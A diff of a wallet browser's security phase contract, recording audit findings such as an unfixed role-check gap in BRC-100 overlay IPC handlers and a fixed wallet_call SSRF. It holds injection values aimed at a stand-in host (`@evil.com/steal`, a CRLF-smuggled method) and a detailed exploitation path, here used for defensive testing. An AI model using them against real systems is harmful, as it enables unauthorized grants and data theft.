@@ -1,7 +1,7 @@
 # Phase 0.5 — money path & trust boundary · PHASE CONTRACT
 
 **Workstream:** WS5(a) · **Ticket:** `../TICKET_loopback_host_form_wallet_routing.md` §6.2, §7.1, §7.3
-**Status:** 🟠 NOT SIGNED OFF — **all known blockers closed; awaiting owner sign-off.** Findings 4, 5 and 6 are fixed and GREEN with REDs run in-session (§4j); the first panel's 3 criticals remain MEASURED and closed. ✅ **§4k — the new critical found 2026-08-19 — is FIXED and GREEN with RED (`81c054c`)**. ✅ **Windows side DONE** (all 4 panel-#3 blockers + pay402, panel re-run complete — relay round 2026-08-21c). ✅ **macOS `wallet_call` SSRF (`P0.5-S1` / the relay's E1, the last macOS-only blocker) FIXED cross-platform, GREEN+RED — §4x** (`d462083`, Mac round 2026-08-21d); the C++ suite now builds+runs on macOS (206/205-pass/1-skip); all 3 macOS parity checks PASS; M1 self-nav code-closed. **Still owed for full sign-off (owner-gated):** the live-browser S1 probe (isolation-blocked here), two open macOS correctness bugs (brc100_auth role string; `wallet_delete_cancel` `__APPLE__` arm), and the E3 scoped macOS-overlay adversarial pass (recommended). Repair prompt: `../SESSION_PROMPT_beta3_p05_repair.md` · **Opened:** 2026-08-18 · **Amended:** 2026-08-19 (§4a–§4c, §5a), 2026-08-19 **repair scope** (§2, §4 split into 0.5a/0.5b, §4e–§4g, §5b, §6) · **Platforms:** both (Rust = one binary; the C++ gates are cross-platform)
+**Status:** 🟠 NOT SIGNED OFF — **all known blockers closed; awaiting owner sign-off.** Findings 4, 5 and 6 are fixed and GREEN with REDs run in-session (§4j); the first panel's 3 criticals remain MEASURED and closed. ✅ **§4k — the new critical found 2026-08-19 — is FIXED and GREEN with RED (`81c054c`)**. ✅ **Windows side DONE** (all 4 panel-#3 blockers + pay402, panel re-run complete — relay round 2026-08-21c). ✅ **macOS `wallet_call` SSRF (`P0.5-S1` / the relay's E1, the last macOS-only blocker) FIXED cross-platform, GREEN+RED — §4x** (`d462083`, Mac round 2026-08-21d); the C++ suite now builds+runs on macOS (206/205-pass/1-skip); all 3 macOS parity checks PASS; M1 self-nav code-closed. **Still owed for full sign-off (owner-gated):** the live-browser S1 probe (isolation-blocked here), two open macOS correctness bugs (brc100_auth role string; `wallet_delete_cancel` `__APPLE__` arm), and the E3 scoped macOS-overlay adversarial pass. 🔴 **E3 DONE (Mac 2026-08-22)** — it surfaced a **HIGH/blocker-candidate, `P0.5-B1` §4y: self-nav role-guard asymmetry** (the `ee8f836` self-nav gate covers only `add_domain_permission*`; ~5 sibling BRC-100 overlay IPC arms — `grant_scoped_permission`/`approve_cert_fields`/reveal/invalidate — are ungated and write persistent grants for an attacker-chosen domain from a self-navved tab; cross-platform, CODE_READING, **reported not fixed** — production gate change is owner-gated). E3 lens (a) close-prevention = LOW parity nit only (mac focus-loss is more protective; seed overlay has no click-outside monitor); lens (c) transport clean (E1 method sink CLOSED-verified; one LOW `REDIR_PROTOCOLS` hardening). Repair prompt: `../SESSION_PROMPT_beta3_p05_repair.md` · **Opened:** 2026-08-18 · **Amended:** 2026-08-19 (§4a–§4c, §5a), 2026-08-19 **repair scope** (§2, §4 split into 0.5a/0.5b, §4e–§4g, §5b, §6) · **Platforms:** both (Rust = one binary; the C++ gates are cross-platform)
 **Standard:** `../HARNESS.md`.
 
 > ⭐ **Scope change, owner-approved 2026-08-19: C1, C2 and C3 are folded into this phase.**
@@ -91,6 +91,7 @@ is rewritten to match.
 | `P0.5-G3` |  `preflight.ps1` gate `G2` passes at baseline **2** (from 5) | Add one new `find("127.0.0.1:5137")` → gate **exits non-zero** even at a non-zero baseline | `preflight.ps1 -NegativeControl` | T0 | ✅ **GREEN** `2 violations, at baseline`; 🔴 observed `3 > 2` |
 | `P0.5-E1` | An origin-less **or origin-forged** frame is gated | Feed both an `about:blank` child **and** the crafted `data:` URL → each must be seen ungated pre-fix | The Rust-side gate outcome | T1 | ✅ **GREEN, RED observed — §4i.** `about:blank` child now inherits `example.com` and is denied; pre-fix empty origin ⇒ `IsInternalOrigin("")==true` ⇒ dispatched. Superseded by `X1` |
 | `P0.5-S1` 🚨**NEW (Mac 2026-08-21d)** — the relay's "E1" `wallet_call` SSRF, distinct from `P0.5-E1` above | `dispatchWalletHttpByMethod` refuses a page-controlled `endpoint`/`method` that would escape the wallet authority or inject CRLF. macOS-only-**exploitable** (libcurl arm had no validation; Windows fails closed only by `ParseUrl`'s accidental digits-only port check), fixed **cross-platform** at the one shared choke — `IsWalletDispatchUrlSafe` anchors url to `WalletBaseUrl()+"/"` + no ctrl chars; `IsValidWalletMethod` = `^[A-Z]{1,8}$`. ⛔ NOT by porting `ParseUrl` | ⛔ Pre-fix: **no validation** — `endpoint="@evil.com/steal"` ⇒ curl fetches `evil.com` from the wallet process; `method="GET\r\nHost: evil"` injects. RED **observed** by weakening both predicates to `return true`: the 5 `Rejects*` unit cases fail, the 2 `Accepts*` hold | The two `PortConfig.h` predicates, unit-testable without CEF/curl (same class as `X4`); production compile confirmed by a clean macOS `HodosBrowserShell` bundle build | T0/T1 | ✅ **GREEN, RED observed — §4x.** `tests/wallet_ssrf_guard_test.cpp` (7 cases) in `hodos_tests`; suite 206/205-pass/1-skip on macOS. ⚠️ Live-browser dynamic probe deferred (needs a signed browser; prod-mode bundle ⛔ opens the real profile) — money-safe dev recipe in relay round 2026-08-21d |
+| `P0.5-B1` 🔴**NEW (Mac E3 2026-08-22)** — self-nav role-guard asymmetry on the BRC-100 overlay IPC family | The self-nav role gate (`role_∈{notification,brc100auth}`) that `ee8f836` added to `add_domain_permission`/`_advanced` (`simple_handler.cpp:4994/5086`) is **also** applied to the sibling privileged arms `grant_scoped_permission` (`:5197`), `approve_cert_fields` (`:5303`), `approve_identity_key_reveal` (`:5396`), `approve_key_linkage_reveal` (`:5444`) — so a self-navigated `tab_<id>` at `127.0.0.1:5137/brc100-auth?…` cannot write a persistent grant for an attacker-chosen domain | ⛔ **Pre-fix (current tree): those arms have NO role check** — a self-navved tab renders the prompt from `window.location.search` (`BRC100AuthOverlayRoot.tsx:381-475,532`) and one Allow click → header-free first-party POST `/domain/permissions/*` → Rust `domain_trust_mw` (`main.rs:44-66`) writes the grant (no `X-Requesting-Domain` backstop). CODE_READING; the general substrate was MEASURED by panel #3 on `add_domain_permission`. Negative control: same tab firing `add_domain_permission` is REFUSED (`:4995`) while the sibling is written = asymmetry | The **absence** of the Layer-2 role check on ~5 shared arms all reachable from role `tab_<id>` via the shared frontend; cross-platform (shared `simple_handler.cpp` + shared `BRC100AuthOverlayRoot.tsx`), surfaced by the mac E3 role lens | T2/T3 | 🔴 **OPEN — HIGH / blocker-candidate. §4y.** Reported, not fixed (production code; HARNESS §6 → stop and ask). Named DEV-only experiment (wallet 31401, never prod) + negative control in relay round 2026-08-22 |
 
 ### Half 0.5b — Rust money path
 
@@ -1737,3 +1738,43 @@ two open macOS correctness bugs the parity pass surfaced — the BRC-100 overlay
 (`"brc100_auth"` vs `"brc100auth"`, `cef_browser_shell_mac.mm:3502`) and `wallet_delete_cancel`'s
 missing `__APPLE__` arm (`simple_handler.cpp:4285`). Neither is a security regression; both are reported
 in relay round 2026-08-21d.
+
+### 4y. `P0.5-B1` — self-nav role-guard asymmetry on the BRC-100 overlay IPC family (Mac E3 2026-08-22, OPEN)
+
+Found by the E3 scoped macOS-overlay adversarial pass (relay round 2026-08-22), while re-auditing the mac
+overlay role surface after `15a3422`. **All CODE_READING**, traced end-to-end and re-verified by artifact;
+not executed this round. **Cross-platform** (shared `simple_handler.cpp` + shared `BRC100AuthOverlayRoot.tsx`) —
+surfaced by the mac lens, not mac-specific.
+
+**The gap.** Panel #3's `ee8f836` closed the MEASURED self-nav grant-forgery on `add_domain_permission` by
+adding `if (role_ != "notification" && role_ != "brc100auth") REFUSE` — but **only** to that arm and
+`add_domain_permission_advanced` (`simple_handler.cpp:4994`, `:5086`). The **same** `/brc100-auth` React
+component (`frontend/src/pages/BRC100AuthOverlayRoot.tsx`) emits ~5 sibling privileged IPCs that have **no**
+role check: `grant_scoped_permission` (`:5197`, persistent V18 protocol/basket/counterparty "always allow"),
+`approve_cert_fields` (`:5303`, persistent identity-cert field disclosure), `approve_identity_key_reveal`
+(`:5396`) / `approve_key_linkage_reveal` (`:5444`, "always allow" reveal cache), `domain_permission_invalidate`
+(`:5165`, revoke/DoS), and `brc100_auth_response` (`:4753`, approves a *pending* request — needs `found`, so it
+can't fabricate but can auto-approve an in-flight one).
+
+**Why reachable.** `ResolveIpcOrigin` (`:2029`) → `IsInternalOrigin` (`HttpRequestInterceptor.cpp:1016`) makes a
+tab self-navigated to `127.0.0.1:5137/...` internal-origin, passing Layer-1 (`:2089`); Layer-2 (role) exists
+only on the two `add_domain_permission*` arms. `BRC100AuthOverlayRoot` renders **every** prompt type from
+`window.location.search` (`:381-475`, `:532-534`), so attacker query params drive the prompt. The C++ handlers
+build **header-free** first-party POSTs to `/domain/permissions/{protocol,basket,counterparty,certificate}`;
+Rust `domain_trust_mw` (`rust-wallet/src/main.rs:44-66`) gates permission surfaces **only** when
+`X-Requesting-Domain` is present, so the header-free first-party POST is written unchecked. **The C++ role gate
+is the only safeguard, and it's absent on these arms.**
+
+**Severity:** HIGH / blocker-candidate for `grant_scoped_permission` + `approve_cert_fields` (fabricate a
+persistent grant for an attacker-chosen domain from one Allow click on a self-navigated prompt — the same class
+as the panel-#3 blocker); Med-High for the two reveal arms (deferred effect); Med for `brc100_auth_response`
+(needs a concurrently-pending request); Low for `domain_permission_invalidate` (DoS/re-prompt).
+
+**GREEN/RED/experiment/negative-control:** see the `P0.5-B1` evidence row (§ evidence table) and relay round
+2026-08-22. Money-safe DEV experiment (wallet 31401, **never** prod 31301, **no** prod-mode bundle).
+
+**Recommended fix — PRODUCTION, owner-gated, NOT applied (HARNESS §6 / CLAUDE.md #13: evidence points at
+production code → stop and ask).** Hoist the self-nav role check into one helper gating the whole
+grant/approve/reveal/invalidate message family once (single shared choke, mirroring S1), so a future privileged
+arm can't be added ungated. A falsifiable unit test needs the gate refactored into a pure predicate (also a
+production change) — deferred to the fix.
